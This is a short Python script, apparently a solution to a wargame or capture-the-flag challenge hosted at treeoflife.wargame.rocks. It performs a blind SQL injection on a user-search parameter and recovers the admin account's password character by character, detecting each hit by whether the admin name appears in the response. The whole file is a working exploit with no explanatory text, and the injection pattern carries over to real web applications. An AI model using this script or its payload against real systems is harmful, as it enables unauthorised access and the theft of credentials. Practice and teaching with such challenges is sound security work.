# -*- coding: utf8 -*-
import requests

cookies        = {'sessionid': 'xxxxxxxxxxxxxxxxxxxxxxxx'}
url_prefix     = "https://treeoflife.wargame.rocks/users/search/?username="
payload_prefix = "userwhodoesntexist' or (id = 1 and substr((select password), "
possible_chars = [chr(c) for c in range(32, 127)]
password       = ""


while True:
  for char in possible_chars:

    payload = url_prefix + payload_prefix + str(len(password) + 1) + ", 1) = '"
    payload += char + "') or '1' = '2"

    result = requests.get(payload, cookies=cookies).text

    # John is the name of the admin account, which we can see on the search page
    if 'John' in result:
      password += char
      print(password)
      break
  else:
    break

print(password)